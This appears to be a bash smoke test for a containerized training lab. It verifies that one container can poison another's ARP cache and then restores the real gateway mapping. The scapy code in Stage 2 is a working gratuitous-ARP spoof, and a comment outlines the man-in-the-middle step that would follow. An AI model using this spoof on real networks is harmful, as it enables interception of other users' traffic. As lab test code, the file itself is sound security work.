#!/usr/bin/env bash
# L2 surface probe. The clab fabric uses real Linux bridges (kind:bridge
# nodes in the per-zone topologies), so containers on the same bridge sit
# on a real L2 segment: ARP behaves as on any unswitched-VLAN office LAN,
# no docker proxy_arp interference. A visitor with code execution on any
# zone container can rewrite peers' ARP caches.
#
# Coverage:
#   Stage 1  victim's ARP cache holds the real gateway MAC at start
#   Stage 2  gratuitous ARP from attacker rewrites the victim's cache
#   Stage 3  corrective ARP restores the real mapping (test cleanup)
#
# The probe deliberately stops at the cache rewrite. Demonstrating actual
# traffic redirection would need conntrack churn that affects other tests.
# Visitor-realistic next step is documented but not asserted: enable IP
# forwarding on the attacker, watch traffic with tcpdump.
#
# Usage: bash tests/smoke/test_arp_poisoning.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="unseen-gate"
VICTIM="wizzards-retreat"
ATTACKER_IFACE="eth1"          # unseen-gate's ics_internet NIC
VICTIM_NEIGH_IFACE="eth1"      # wizzards-retreat's ics_internet NIC
GATEWAY_IP="10.10.0.200"       # inet-dmz-fw on ics_internet
VICTIM_IP="10.10.0.10"

require_running "$ATTACKER"
require_running "$VICTIM"

# Discover the real MACs once: attacker (used to spoof) and gateway (used
# to restore). Avoids hard-coding values that change on every clab deploy.
ATTACKER_MAC="$(docker exec "$ATTACKER" sh -c "cat /sys/class/net/${ATTACKER_IFACE}/address" | tr -d '\r\n')"
GATEWAY_MAC="$(docker exec inet-dmz-fw sh -c 'cat /sys/class/net/eth2/address' | tr -d '\r\n')"
[ -n "$ATTACKER_MAC" ] || fail "could not read attacker MAC"
[ -n "$GATEWAY_MAC" ]  || fail "could not read gateway MAC"

# Warm the victim's ARP cache so there's something to poison.
docker exec "$VICTIM" ping -c1 -W1 "$GATEWAY_IP" >/dev/null 2>&1 || true

echo "[arp] Stage 1: victim ARP cache holds the real gateway MAC"
PRE="$(docker exec "$VICTIM" ip neigh show "$GATEWAY_IP" dev "$VICTIM_NEIGH_IFACE" 2>&1)"
assert_contains "$PRE" "$GATEWAY_MAC" "10.10.0.200 maps to real gateway MAC before attack"

echo "[arp] Stage 2: gratuitous ARP from attacker rewrites the cache"
docker exec "$ATTACKER" /opt/attacker-env/bin/python3 -c "
from scapy.all import Ether, ARP, sendp
pkt = Ether(src='$ATTACKER_MAC', dst='ff:ff:ff:ff:ff:ff') / \
      ARP(op=2, hwsrc='$ATTACKER_MAC', psrc='$GATEWAY_IP',
          hwdst='ff:ff:ff:ff:ff:ff', pdst='$VICTIM_IP')
sendp(pkt, iface='$ATTACKER_IFACE', count=3, verbose=False)
" >/dev/null 2>&1 || fail "scapy poison send failed"
sleep 1
POISONED="$(docker exec "$VICTIM" ip neigh show "$GATEWAY_IP" dev "$VICTIM_NEIGH_IFACE" 2>&1)"
assert_contains "$POISONED" "$ATTACKER_MAC" "10.10.0.200 maps to attacker MAC after poison"
assert_absent  "$POISONED" "$GATEWAY_MAC"  "real gateway MAC no longer in victim cache"

echo "[arp] Stage 3: corrective ARP restores the real mapping"
docker exec "$ATTACKER" /opt/attacker-env/bin/python3 -c "
from scapy.all import Ether, ARP, sendp
pkt = Ether(src='$GATEWAY_MAC', dst='ff:ff:ff:ff:ff:ff') / \
      ARP(op=2, hwsrc='$GATEWAY_MAC', psrc='$GATEWAY_IP',
          hwdst='ff:ff:ff:ff:ff:ff', pdst='$VICTIM_IP')
sendp(pkt, iface='$ATTACKER_IFACE', count=3, verbose=False)
" >/dev/null 2>&1 || fail "scapy restore send failed"
sleep 1
POST="$(docker exec "$VICTIM" ip neigh show "$GATEWAY_IP" dev "$VICTIM_NEIGH_IFACE" 2>&1)"
assert_contains "$POST" "$GATEWAY_MAC" "10.10.0.200 maps back to real gateway MAC after restore"

summary
